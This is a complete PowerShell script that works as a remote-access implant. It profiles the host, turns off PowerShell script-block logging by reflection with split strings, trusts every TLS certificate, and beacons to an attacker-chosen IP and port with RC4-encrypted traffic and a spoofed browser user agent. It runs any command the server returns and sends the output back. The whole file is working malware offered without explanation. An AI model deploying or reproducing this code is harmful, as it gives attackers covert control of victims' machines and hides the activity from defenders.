function Get-UserInfo {
    
    PROCESS {
        if( -not (Test-Path env:userdomain)) {
            $VAR1 = $env:computername
        } else {
            $VAR1 = $env:userdomain
        }
        
        try {
            $VAR2 = (Get-WmiObject Win32_NetworkAdapterConfiguration | Where {$_.DefaultIPGateway -ne $null}).IPAddress | Select-Object -First 1
        } catch {
            $VAR2 = "Unknown"
        }
        
        $VAR3 = "x64"
        
        if([IntPtr]::size -eq 4) {
            $VAR3 = "x86"
        }
        
        return "$($VAR3) - $($VAR2):$($VAR1)\$($env:username)"   
    }
}

function Random-String {
    [CmdletBinding()]
    Param (
        [Parameter(Position = 1, Mandatory = $True)]
        [int]$Length
    )
    
    PROCESS {
        $VAR4 = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789".ToCharArray()
        $VAR5 = ""
        For ($VAR6 = 0; $VAR6 -lt $Length; $VAR6++) {
            $VAR5 += $VAR4 | Get-Random
        }
        
        return $VAR5
    }
}

function Crypto-RC4 {
    [CmdletBinding()]
    Param (
        [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [ValidateNotNullOrEmpty()]
        [Byte[]]$Bytes,
        [Parameter(Position = 1, Mandatory = $True)]
        [Byte[]]$Key
    )

    BEGIN {
        [Byte[]] $VAR7 = 0..255
        $VAR8 = 0
        0..255 | ForEach-Object {
            $VAR8 = ($VAR8 + $VAR7[$_] + $Key[$_ % $Key.Length]) % 256
            $VAR7[$_], $VAR7[$VAR8] = $VAR7[$VAR8], $VAR7[$_]
        }
        $VAR9 = $VAR8 = 0
    }

    PROCESS {
        ForEach($VAR10 in $Bytes) {
            $VAR9 = ($VAR9 + 1) % 256
            $VAR8 = ($VAR8 + $VAR7[$VAR9]) % 256
            $VAR7[$VAR9], $VAR7[$VAR8] = $VAR7[$VAR8], $VAR7[$VAR9]
            $VAR10 -bxor $VAR7[($VAR7[$VAR9] + $VAR7[$VAR8]) % 256]
        }
    }
}

function RC4-DecodeBase64 {
    [CmdletBinding()]
    Param (
    [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [string]$Buffer,
        [Parameter(Mandatory = $True)]
        [string]$Key
    )
    
    PROCESS {
        $VAR11 = [Convert]::FromBase64String($Buffer)
        $VAR12 = ($VAR11 | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
        return [Text.Encoding]::ASCII.GetString($VAR12)
    }
}

function RC4-EncodeBase64 {
    [CmdletBinding()]
    Param (
    [Parameter(Position = 0, Mandatory = $True, ValueFromPipeline = $True)]
        [string]$Buffer,
        [Parameter(Mandatory = $True)]
        [string]$Key
    )
    
    PROCESS {
        $VAR13 = [Text.Encoding]::ASCII.GetBytes($Buffer)
        $VAR14 = ($VAR13 | Crypto-RC4 -Key ([Text.Encoding]::ASCII.GetBytes($Key)))
        return [Convert]::ToBase64String($VAR14)
    }
}

function PS-RemoteShell { 
    [CmdletBinding()]
    Param (
        [Parameter(Mandatory=$True)]
        [string]$Ip,
        [Parameter(Mandatory=$True)]
        [int]$Port,
        [Parameter(Mandatory=$True)]
        [string]$Key,
        [Parameter(Mandatory=$False)]
        [int]$Delay = 10000,
        [Parameter(Mandatory=$False)]
        [string]$Protocol = "http"
    )
   
    BEGIN {
        Try {
            $VAR15 = [ref].Assembly.GetType('System.Management.Automation.Utils').GetField('cache'+'dGrou'+'pPoli'+'cySettings', 'No'+'nPub'+'lic,Static')
            $VAR16 = $VAR15.GetValue($null)
            $VAR16['ScriptBlockLogging']['EnableScriptBlockLogging'] = 0
            $VAR16['ScriptBlockLogging']['EnableScriptBlockInvocationLogging'] = 0
        } Catch {
            $error.Clear()
        }
    }

    PROCESS {
        $VAR17 = $False
        $VAR18 = Random-String -Length 16
        $VAR19 = Get-UserInfo
        $VAR21 = "register $($VAR18) $($VAR19)"
        (New-Object System.Net.WebClient).Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials
        
        While($VAR17 -ne $True) {
          $VAR22 = Random-String -Length $(Get-Random -Minimum 5 -Maximum 16)
            if ($Protocol -eq "https") {
                $VAR20 = @"
                    using System.Net;
                    using System.Security.Cryptography.X509Certificates;
                    public class TrustAllCertsPolicy : ICertificatePolicy {
                        public bool CheckValidationResult(
                            ServicePoint srvPoint, X509Certificate certificate,
                            WebRequest request, int certificateProblem) {
                            return true;
                        }
                    }
"@
                    
                Add-Type $VAR20
                
                [System.Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy            
            }
                    
            $VAR23 = ""
            Start-Sleep -m $Delay
            $Url = "$($Protocol)://$($Ip):$($Port)/$($VAR22)?$($VAR18)"
            $VAR21 = RC4-EncodeBase64 -Buffer $VAR21 -Key $Key
            Try {
                $VAR24 = Invoke-WebRequest -Uri $Url -Method POST -Body $VAR21 -UserAgent "Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:57.0) Gecko/20100101 Firefox/57.0" -TimeoutSec 10 -UseBasicParsing
                $VAR23 = RC4-DecodeBase64 -Buffer $VAR24 -Key $Key
            } Catch {
                $VAR23 = ""
                $error.Clear()
            }
            
            $VAR25 = $VAR23.Split(" ", 2)
            if($VAR25[0] -eq "delay") {
                $Delay = [Int]$VAR25[1]
                $VAR26 = "Delay is now $($Delay)"
            } else {
                $VAR26 = ([ScriptBlock]::Create($VAR23).Invoke() | Out-String)
            }
            
            $VAR27 = ($error[0] | Out-String)
            
            if($VAR26 -eq "" -And $VAR27 -eq "") {
                $VAR28 = Get-Random -Maximum 50 -Minimum 1
                $VAR29 = Random-String -Length $VAR28
                $VAR26 = "hello $($VAR29)"
            }
            
            $VAR26  = $VAR26 + "`n"
            
            $error.Clear()
            $VAR21 = $VAR26 + $VAR27
        }
    }
}
